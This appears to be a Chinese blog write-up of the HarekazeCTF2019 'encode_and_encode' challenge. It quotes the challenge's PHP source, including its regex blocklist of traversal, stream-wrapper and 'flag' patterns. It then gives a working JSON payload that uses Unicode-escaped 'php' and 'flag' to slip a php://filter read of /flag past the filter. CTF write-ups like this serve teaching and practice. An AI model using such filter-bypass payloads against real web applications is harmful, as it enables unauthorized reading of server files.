---
title: '[HarekazeCTF2019]encode_and_encode 1'
categories:
  - 
tags: []
abbrlink: 110c9091
date: 2026-03-01 18:51:31
---
# [HarekazeCTF2019]encode_and_encode

# 1



1.php对请求体body的两种处理逻辑：

#### 逻辑 A：自动解析到 `$_POST`

当 PHP 接收到 POST 请求时，它会先查看 **Header** 中的 `Content-Type`：

1. 如果 `Content-Type` 是 `application/x-www-form-urlencoded`（普通表单）或 `multipart/form-data`（带文件的表单）。
2. PHP 解释器会自动触发**解析引擎**。
3. 它会将 Body 里的字符串按照 `key=value` 的格式拆解，并填充到全局数组 `$_POST` 中。
4. **限制**：如果格式不是上述两种（例如是 `application/json`），PHP 的解析引擎就不会动作，`$_POST` 就会保持为空。

#### 逻辑 B：原始读取到 `php://input`

`php://input` 是一个只读的**流（Stream）**，它直接指向 HTTP 请求的 **Body 原始区域**：

1. 它不经过 PHP 的“解析引擎”，因此不需要关心 `Content-Type`。
2. 它直接访问内存中存放 Body 字节流的地址。
3. **结果**：无论你发的是什么（JSON、XML、甚至是乱码），只要它在 Body 里，`file_get_contents('php://input')` 就能抓到一模一样的原始字符串。



2.字符的两种表达等价性

在 JSON 规范（RFC 8259）中，字符可以有两种表示方式：

1. **字面值**：直接输入 `a`。
2. **转义序列**：输入 `\u0061`。

（`\u0061` 属于 **Unicode 编码**，更具体地说，它是 **Unicode 字符的十六进制转义表示法**。）

在 **JSON 解析引擎** 的逻辑里，这两者是完全等价的。`\u` 后面的四位十六进制数对应 Unicode 编码表中的位置，`61`（十六进制）在十进制中是 `97`，即字母 `a`。

---





题目叫做 `Encode & Encode`,猜测跟编码有关



点击Source Code，查看http://15fa3901-c00c-427e-be0d-b813ff0bd2d3.node5.buuoj.cn:81/query.php?source

得到源码

```
<?php
error_reporting(0);

if (isset($_GET['source'])) {
  show_source(__FILE__);
  exit();	//这里一旦url中有source存在，代码逻辑是给你看完源码，但看完后直接退出不进行代码执行了，那我们怎么能通过某些方法看到flag呢？他都不执行我们想要塞入的代码了？
}

function is_valid($str) {	//过滤函数
  $banword = [
    // no path traversal	//不能路径穿越
    '\.\.',
    // no stream wrapper	//不能伪协议读取
    '(php|file|glob|data|tp|zip|zlib|phar):',
    // no data exfiltration	//不能有flag四个字
    'flag'
  ];
  $regexp = '/' . implode('|', $banword) . '/i';
  if (preg_match($regexp, $str)) {	//对传入的str进行过滤
    return false;
  }
  return true;
}

$body = file_get_contents('php://input');	//取出post上传的body部分内容
$json = json_decode($body, true);	//进行json转换成php能理解的变量

if (is_valid($body) && isset($json) && isset($json['page'])) {	//检查body违禁词，检查json格式和page的存在
  $page = $json['page'];
  $content = file_get_contents($page);
  if (!$content || !is_valid($content)) {	
    $content = "<p>not found</p>\n";
  }
} else {
  $content = '<p>invalid request</p>';
}

// no data exfiltration!!!
$content = preg_replace('/HarekazeCTF\{.+\}/i', 'HarekazeCTF{&lt;censored&gt;}', $content);	//正则匹配：如果读取到的page的内容里面出现了此样式，就把里面flag的内容改成censored
echo json_encode(['content' => $content]);
显示content，即page的内容
```



1.绕过exit()

url中去掉source



2.绕过正则

传入json格式的page值本应为 php://filter/convert.base64-encode?resource=/flag

这里把输出内容变成了64编码已经绕过了后面的`$content = preg_replace('/HarekazeCTF\{.+\}/i', 'HarekazeCTF{&lt;censored&gt;}', $content);`

只需要绕过前面伪协议和flag就行



这里考虑**Unicode 编码**绕过

具体地说， 用**Unicode 字符的十六进制转义表示法**绕过



看一下运行顺序：

```
1.Unicode还原成正常字符
$json = json_decode($body, true);	

2.正则
is_valid($body)	//body的内容还是原来的Unicode，当然不会被查出来
isset($json) 	//json也不需要is_valid的检查，没问题
isset($json['page'])	//没问题
is_valid($content))	//没问题
 
preg_replace('/HarekazeCTF\{.+\}/i', 'HarekazeCTF{&lt;censored&gt;}', $content);	//没问题

```



那么只要把`php://filter/convert.base64-encode?resource=/flag`的php和flag用unicode编码就行

https://www.tandaima.com/unicode.html



```
\u0070\u0068\u0070://filter/convert.base64-encode?resource=/\u0066\u006c\u0061\u0067
{"page":"\u0070\u0068\u0070://filter/convert.base64-encode/resource=/\u0066\u006c\u0061\u0067"}
```



![image-20260301184750043](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260301184750043.png)

解码得到flag